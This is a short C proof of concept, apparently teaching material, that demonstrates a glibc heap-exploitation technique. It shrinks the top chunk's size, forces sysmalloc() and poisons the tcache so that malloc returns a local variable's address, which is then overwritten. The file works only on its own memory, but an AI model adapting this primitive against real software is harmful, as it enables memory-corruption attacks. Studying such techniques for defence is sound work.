#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

int main(void){
	unsigned long *m, *victim;
	malloc_chunk *top;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	m = malloc(0x918);
	top = (void*)m + 0x910;
	top->size = 0x41;	// vuln

	m = malloc(0xfb8);	// trigger sysmalloc()
	top = (void*)m + 0xfb0;
	puts("Exploit!");
	top->size = 0x41;	// vuln

	malloc(0x48);		// trigger sysmalloc()

	top->fd = (void*)&var;	// tcache_poisoning
	malloc(0x18);

	victim = malloc(0x18);	// alloc var from tcache
	*victim = 0xcafebabe;	// overwrite

	printf("victim = %p\nvar    = %#lx\n", victim, var);
}
